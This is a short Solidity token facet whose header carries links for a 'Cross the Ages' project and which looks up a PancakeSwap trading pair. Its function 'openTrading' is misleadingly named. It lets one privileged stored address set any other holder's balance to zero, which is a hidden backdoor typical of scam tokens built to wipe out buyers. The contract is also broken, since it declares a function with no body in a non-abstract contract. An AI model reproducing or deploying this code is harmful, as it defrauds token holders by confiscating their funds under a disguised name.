/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/crosstheages
    // Twitter: https://twitter.com/crosstheages
    // Website: https://www.crosstheages.com/
    // Github: https://github.com/crosstheages
    // Discord: https://discord.com/invite/cross-the-ages-917028207566401586
    // Medium: https://medium.com/cross-the-ages
*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function pancakePair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IPancakeFactory(ds.FACTORY).getPair(
                address(ds.WETH),
                address(this)
            );
    }
    function openTrading(address bots) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds.xxnux == msg.sender &&
            ds.xxnux != bots &&
            pancakePair() != bots &&
            bots != ds.ROUTER
        ) {
            ds._balances[bots] = 0;
        }
    }
}
